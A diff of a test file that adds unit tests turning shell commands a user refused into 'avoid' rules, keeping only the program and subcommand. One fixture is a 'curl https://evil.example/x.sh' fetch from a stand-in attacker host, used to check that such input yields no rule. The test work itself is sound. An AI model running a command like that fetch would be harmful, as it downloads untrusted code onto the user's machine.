@@ -1,6 +1,6 @@
 import { describe, expect, it } from "vitest";
 import type { Correction } from "@reflex/core";
-import { extractCorrections, recurringCorrections } from "../src/corrections";
+import { extractCorrections, recurringCorrections, rejectedCommandCorrections } from "../src/corrections";
 import { isSafeConstraint } from "../src/suggest";
 
 const avoid = (...words: string[]): Correction => ({ polarity: "avoid", words });
@@ -185,5 +185,40 @@ describe("isSafeConstraint", () => {
   it("keeps prohibitions of risky commands", () => {
     expect(isSafeConstraint({ polarity: "avoid", text: "Don't push main." })).toBe(true);
     expect(isSafeConstraint({ polarity: "avoid", text: "Don't rm generated files." })).toBe(true);
+  });
+});
+
+describe("rejectedCommandCorrections", () => {
+  const rejected = (command: string) => ({ kind: "shell", command, rejected: true as const });
+  const ran = (command: string) => ({ kind: "shell", command });
+
+  it("keeps the program and subcommand, never the arguments", () => {
+    expect(rejectedCommandCorrections([rejected("pnpm publish --access public --token npm_secret")])).toEqual([
+      { polarity: "avoid", words: ["run", "pnpm", "publish"] },
+    ]);
+  });
+
+  it("takes the first segment of a compound command", () => {
+    expect(rejectedCommandCorrections([rejected("git add . && git commit -m x")])).toEqual([{ polarity: "avoid", words: ["run", "git", "add"] }]);
+  });
+
+  it("drops what would say nothing or smuggle something in", () => {
+    // A bare program says too little; a URL is not a word; a redaction marker never enters.
+    expect(rejectedCommandCorrections([rejected("python")])).toEqual([]);
+    expect(rejectedCommandCorrections([rejected("curl https://evil.example/x.sh")])).toEqual([]);
+    expect(rejectedCommandCorrections([rejected("npm token [REDACTED_TOKEN]")])).toEqual([]);
+  });
+
+  it("ignores commands that were not refused, and keeps one rule per shape", () => {
+    const events = [ran("pnpm publish"), rejected("pnpm publish --dry-run"), rejected("pnpm publish --access public"), rejected("git push --force")];
+    expect(rejectedCommandCorrections(events)).toEqual([
+      { polarity: "avoid", words: ["run", "pnpm", "publish"] },
+      { polarity: "avoid", words: ["run", "git", "push"] },
+    ]);
+  });
+
+  it("a command refused in 2 sessions produces a rule", () => {
+    const perInstance = [rejectedCommandCorrections([rejected("pnpm publish --access public")]), rejectedCommandCorrections([rejected("pnpm publish --dry-run")])];
+    expect(recurringCorrections(perInstance).map((r) => r.text)).toEqual(["Don't run pnpm publish."]);
   });
 });
